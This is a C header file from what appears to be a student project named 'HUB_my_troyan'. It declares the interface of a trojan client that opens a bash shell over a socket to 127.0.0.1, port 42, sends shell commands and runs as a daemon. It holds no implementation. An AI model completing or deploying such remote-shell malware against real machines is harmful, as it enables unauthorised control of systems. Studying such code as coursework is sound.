/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 29/04/2021 client.h
*/

#ifndef CLIENT_H
#define CLIENT_H

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "daemon.h"
#include "socket.h"
#include "utility.h"
#include "client_t.h"

/// MACRO
#define SHELL_NAME "bash"
#define LOGOUT_CMD "exit"

#define IP "127.0.0.1"
#define PORT 42

#define EXIT_QUIT 21

/// SHELL
int shell_client_init(socket_t *client, shell_t *shell);
void shell_stop(shell_t *shell);
int send_shell_command(shell_t *shell, const char *command);

/// CLIENT
int client(void);

#endif // CLIENT_H
